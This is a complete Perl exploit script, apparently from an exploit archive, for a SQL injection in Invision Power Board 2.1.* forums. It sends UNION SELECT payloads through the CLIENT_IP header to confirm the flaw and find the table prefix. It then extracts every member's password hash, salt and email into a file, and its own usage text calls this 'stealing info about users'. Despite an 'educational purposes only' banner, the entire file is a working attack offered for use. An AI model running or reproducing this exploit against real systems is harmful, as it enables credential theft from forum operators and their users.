#!/usr/bin/perl
use LWP::UserAgent; 
$ua = LWP::UserAgent->new; 
&header();
if (@ARGV < 2) {&info(); exit();}
$server = $ARGV[0];
$dir = $ARGV[1];
print "[+] SERVER {$server}\r\n";
print "[+] DIR {$dir}\r\n";
#Step 1, detecting vulnerability
print "[1] Testing forum vulnerability...";
$q = "UNION SELECT 'VULN',1,1,1/*";
query($q,$server,$dir);
if($rep =~/VULN/){ print "forum vulnerable\r\n"; }
else 
    {
     print "forum unvulnerable\r\n";
	 &footer();
     exit();
    }
#Step 2, detecting prefix
print "[2] Searching prefix...";
$q = "";
query($q,$server,$dir);
$prefix = $rep;
print $prefix."\r\n";
#Step 3, make query
print "[3] Performing query; it may take several minutes, plz, wait...\r\n";
$q1 = "UNION SELECT MAX(converge_id),1,1,1 FROM ".$prefix."members_converge/*";
query($q1,$server,$dir);
$kol = $rep;
open(RES,">".$server."_result.txt");
for($id = 1; $id <= $kol; $id++)
    {
	 $own_query = "UNION SELECT converge_pass_hash,1,1,1 FROM ".$prefix."members_converge WHERE converge_id=".$id."/*";
     query($own_query,$server,$dir);
     if($rep=~/[0-9a-f]{32}/i) 
	    {
	     $hash = $rep;
		 $own_query = "UNION SELECT converge_pass_salt,1,1,1 FROM ".$prefix."members_converge WHERE converge_id=".$id."/*";
         query($own_query,$server,$dir);
         if(length($rep)==5) 
		    {
			 $salt = $rep;
			 $own_query = "UNION SELECT converge_email,1,1,1 FROM ".$prefix."members_converge WHERE converge_id=".$id."/*";
             query($own_query,$server,$dir);
			 if(length($rep)>0)
			    {
				 $email = $rep;
				 print RES $id.":".$hash.":".$salt."::".$email."\n";
			    }
			}		 
		}
    }
close(RES);
print "[!] Query was successfully perfomed. Results are in txt files\r\n";
&footer();
$ex = <STDIN>;
sub footer()
    {
     print "[G] Greets: 1dt.w0lf (rst/ghc)\r\n";
     print "[L] Visit: secbun.info | damagelab.org | rst.void.ru\r\n";
    }
sub header()
{
print q(
----------------------------------------------------------
* Invision Power Board 2.1.* Remote SQL Injecton Exploit *
*       Based on r57-Advisory#41 by 1dt.w0lf (rst/ghc)   *
*                Coded by w4g.not null                   *
*              FOR EDUCATIONAL PURPOSES *ONLY*           *
----------------------------------------------------------
);
}
sub info()
{
 print q(
[i] Usage: perl w4gipb216.pl [server] [/dir/]
     where
	   |- server - server, where IPB installed without http://
	   |- /dir/ - dir, where IPB installed or / for no dir
	 e.g perl w4gipb216.pl someserver.com /forum/
[i] Stealing info about users (format id:pass:salt::email)	  
[!] Need MySQL > 4.0 
 );
}
sub query()
    {
     my($q,$server,$dir) = @_;
     $res = $ua->get("http://".$server.$dir."index.php?s=w00t",'USER_AGENT'=>'','CLIENT_IP'=>"' ".$q); 
     if($res->is_success)
        {
         $rep = '';
         if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $rep = $3; }
         else
   		    {
             if($res->as_string =~ /FROM (.*)sessions/) { $rep = $1; }
            }
        }
     return $rep;
    }
